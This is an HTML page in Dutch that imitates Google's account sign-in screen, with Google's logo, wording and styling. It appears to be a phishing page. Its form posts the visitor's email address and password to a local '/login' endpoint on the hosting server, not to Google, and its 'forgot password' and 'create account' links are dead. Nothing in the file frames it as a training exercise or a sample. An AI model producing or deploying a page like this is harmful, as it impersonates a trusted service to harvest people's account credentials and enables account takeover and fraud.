<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inloggen - Google-accounts</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            width: 100%;
            max-width: 450px;
            padding: 40px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }
        @media (max-width: 450px) {
            .login-box { border: none; padding: 20px; }
        }
        .google-logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
        .input-container { text-align: left; }
        input {
            width: 100%;
            padding: 13px 15px;
            margin-bottom: 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        .blue-text {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            cursor: pointer;
            float: left;
        }
        .button-container {
            margin-top: 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        button:hover { background-color: #1b66c9; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="google-logo" alt="Google">
        <h1>Inloggen</h1>
        <p>Gebruik je Google-account</p>
        
        <form action="/login" method="POST">
            <div class="input-container">
                <input type="email" name="email" placeholder="E-mailadres of telefoonnummer" required>
                <input type="password" name="password" placeholder="Wachtwoord opgeven" required>
            </div>
            
            <a class="blue-text">Wachtwoord vergeten?</a>
            
            <div class="button-container">
                <a class="blue-text" style="margin-top: 10px;">Account maken</a>
                <button type="submit">Volgende</button>
            </div>
        </form>
    </div>
</body>
</html>
